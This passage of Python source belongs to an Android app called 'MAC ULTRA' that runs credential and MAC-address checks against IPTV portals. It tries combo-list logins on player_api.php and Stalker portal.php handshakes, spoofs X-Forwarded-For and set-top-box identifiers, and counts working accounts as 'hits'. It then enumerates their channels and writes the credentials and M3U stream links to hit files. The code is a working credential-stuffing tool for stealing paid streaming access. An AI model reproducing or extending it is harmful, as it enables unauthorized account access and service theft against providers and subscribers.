                                    exp, days = self.get_clean_time(js.get('exp_date')); cre_date, _ = self.get_clean_time(js.get('created_at'))
                                    act_c, max_c = str(js.get('active_cons','0')), str(js.get('max_connections','1'))
                                    l_c, m_c, s_c, l_l, m_l, s_l = 0, 0, 0, "", "", ""
                                    if self.detail_slider.value == 1:
                                        try:
                                            r_lc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_live_categories", headers=ua_headers)).json()
                                            l_c, l_l = len(r_lc), " «💢» ".join([c.get('category_name') for c in r_lc[:10]])
                                            r_mc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_vod_categories", headers=ua_headers)).json()
                                            m_c, m_l = len(r_mc), " «💢» ".join([c.get('category_name') for c in r_mc[:10]])
                                            r_sc = (await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_series_categories", headers=ua_headers)).json()
                                            s_c, s_l = len(r_sc), " «💢» ".join([c.get('category_name') for c in r_sc[:10]])
                                        except: pass
                                    star = "⭐" if int(max_c) > 1 else ""
                                    self.hits += 1
                                    self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT {star}][/color] {u} | [color=00FFFF]{days}[/color]")
                                    self.save_hit(portal, portal_ip, ua_headers.get('User-Agent'), u, exp, days, p, l_c, m_c, s_c, sn, dev_id, l_l, m_l, s_l, geo_i['tz'], act_c, max_c, True, cre_date)
                else:
                    mac = ":".join(line.split(':')[0:6]).upper()
                    stb_h = {**ua_headers, "X-STB-SN": sn, "X-STB-Device-ID": dev_id, "X-Forwarded-For": fake_ip, "Cookie": f"mac={urllib.parse.quote(mac)}; stb_lang=en; timezone={urllib.parse.quote(geo_i['tz'])};"}
                    r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=stb_h)
                    self.last_status = str(r.status_code)
                    if r.status_code == 200 and 'token' in r.text:
                        tk = r.json().get('js', {}).get('token'); stb_h["Authorization"] = f"Bearer {tk}"
                        ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=stb_h)
                        js = ri.json().get('js', {}); exp_raw = js.get('end_date') or js.get('phone') or "Unlimited"
                        exp, days = self.get_clean_time(exp_raw); cre_date, _ = self.get_clean_time(js.get('reg_date'))
                        pw, act_c, max_c = str(js.get('parent_password') or "0000"), str(js.get('active_cons') or "0"), str(js.get('max_connections') or "1")
                        l_c, m_c, s_c, l_l, m_l, s_l = 0, 0, 0, "", "", ""
                        if self.detail_slider.value == 1:
                            try:
                                r_l = (await client.get(f"{portal}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml", headers=stb_h)).json()
                                l_c = len(r_l.get('js', {}).get('data', []))
                                cat_l = (await client.get(f"{portal}/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml", headers=stb_h)).json()
                                l_l = " «💢» ".join([c.get('title') for c in cat_l.get('js', [])[:10]])
                                r_v = (await client.get(f"{portal}/portal.php?type=vod&action=get_ordered_list&JsHttpRequest=1-xml", headers=stb_h)).json()
                                m_c = r_v.get('js', {}).get('total_items', "0")
                                cat_m = (await client.get(f"{portal}/portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml", headers=stb_h)).json()
                                m_l = " «💢» ".join([c.get('title') for c in cat_m.get('js', [])[:10]])
                                r_s = (await client.get(f"{portal}/portal.php?type=series&action=get_ordered_list&JsHttpRequest=1-xml", headers=stb_h)).json()
                                s_c = r_s.get('js', {}).get('total_items', "0")
                                cat_s = (await client.get(f"{portal}/portal.php?type=series&action=get_categories&JsHttpRequest=1-xml", headers=stb_h)).json()
                                s_l = " «💢» ".join([c.get('title') for c in cat_s.get('js', [])[:10]])
                            except: pass
                        star = "⭐" if int(max_c) > 1 else ""
                        self.hits += 1
                        self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT {star}][/color] {mac} | [color=00FFFF]{days}[/color]")
                        self.save_hit(portal, portal_ip, ua_headers.get('User-Agent'), mac, exp, days, pw, l_c, m_c, s_c, sn, dev_id, l_l, m_l, s_l, geo_i['tz'], act_c, max_c, False, cre_date)
            except: self.last_status = "ERR"

    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if raw_str.isdigit() and len(raw_str) >= 9:
            try:
                dt = datetime.fromtimestamp(int(raw_str)); days_diff = (dt - datetime.now()).days
                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
            except: pass
        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]: return "Unlimited", "Unlimited"
        try:
            parts = raw_str.split(','); clean_date = f"{parts[0].strip()}, {parts[1].strip()}" if len(parts) >= 2 else raw_str.strip()
            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
                try:
                    dt = datetime.strptime(clean_date, fmt); days_diff = (dt - datetime.now()).days
                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
                except: continue
        except: pass
        return raw_str, "Unlimited"

    def save_hit(self, portal, portal_ip, server_h, id_val, exp, days, pw, live, movies, series, sn, dev_id, l_list, m_list, s_list, tz_val, active_conn, max_conn, is_m3u=False, cre_date="N/A"):
        final_dir = os.path.join("/storage/emulated/0/Hits/MAC-ULTRA-Hits", "M3U_Hits" if is_m3u else "MAC_Hits")
        if not os.path.exists(final_dir): os.makedirs(final_dir, exist_ok=True)
        domain = portal.replace("http://", "").replace("https://", "").split(":")[0].replace("/", "_")
        m3u = f"{portal}/get.php?mac={id_val}&type=m3u_plus&output=ts" if not is_m3u else f"{portal}/get.php?username={id_val}&password={pw}&output=ts"
        box = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🌟  𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗥𝗘𝗦𝗨𝗟𝗧  🌟          
      🛡️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗱 𝗯𝘆 𝗠𝗼𝗿𝗽𝗵𝗲𝘂𝘀 🛡️     
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🌐 𝗣𝗼𝗿𝘁𝗮𝗹 : {portal}/c/
  📡 𝗜𝗣      : {portal_ip} ({self.portal_isp})
  ⚙️ 𝗦𝗲𝗿𝘃𝗲𝗿  : {server_h}
  🆔 {'𝗨𝘀𝗲𝗿' if is_m3u else '𝗠𝗔𝗖'}    : {id_val}
  🔐 {'𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱' if is_m3u else '𝗔𝗱𝘂𝗹𝘁'} : {pw}
  📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 : {cre_date}
  📅 𝗘𝘅𝗽𝗶𝗿𝘆 : {exp} (⌛ {days})
  🧱 𝗦𝗡     : {sn}
  📲 𝗗𝗲𝘃 𝗜𝗗 : {dev_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗞𝗘𝗡:
  🎬 Filme  : {movies}
  🎞️ Serien : {series}
  📡 Live TV: {live}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛸 𝗔𝗰𝘁𝗶𝘃𝗲     : {active_conn}
  🛸 𝗠𝗮𝘅 𝗖𝗼𝗻𝗻. : {max_conn}
  🛸 𝗭𝗼𝗻𝗲       : {tz_val}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗠𝟯𝗨 𝗟𝗜𝗡𝗞:
  {m3u}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}

"""
        if l_list: box += f" 📂 𝗟𝗜𝗩𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {l_list} ❳\n\n"
        if m_list: box += f" 🎬 𝗠𝗢𝗩𝗜𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {m_list} ❳\n\n"
        if s_list: box += f" 🎞️ 𝗦𝗘𝗥𝗜𝗘𝗦 𝗟𝗜𝗦𝗧\n ╚┈❲ {s_list} ❳\n\n"
        with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f: f.write(box)

    def refresh_ui(self, *a):
        self.pbar.value, self.hit_count_label.text = self.checked, str(self.hits)
        self.progress_label.text, self.status_code_label.text = f"PROGRESS: {self.checked} / {self.total_lines}", self.last_status
        el = time.time() - self.start_time
        if el > 0: self.cpm_label.text = str(int((self.checked / el) * 60))

class MagApp(App):

    def build(self):
        self.title = "MAC ULTRA"

        sm = ScreenManager()

        sm.add_widget(MagUltraScreen(name='main'))
        sm.add_widget(PortalManagerScreen(name='portals'))

        
        Clock.schedule_interval(self.recheck_access, 30)

        return sm

    def recheck_access(self, dt):

        
        if not client_is_allowed():

            try:
                main = self.root.get_screen('main')

                
                main.running = False

                
                main.stop_native_audio()

                
                main.update_log_safe(
                    "[color=FF0000][ACCESS DENIED][/color] Gerät wurde gesperrt."
                )

            except Exception:
                pass

            
            self.stop()

if __name__ == "__main__":
    if client_is_allowed():
        prepare_assets()
        MagApp().run()
    else:
        show_access_denied()
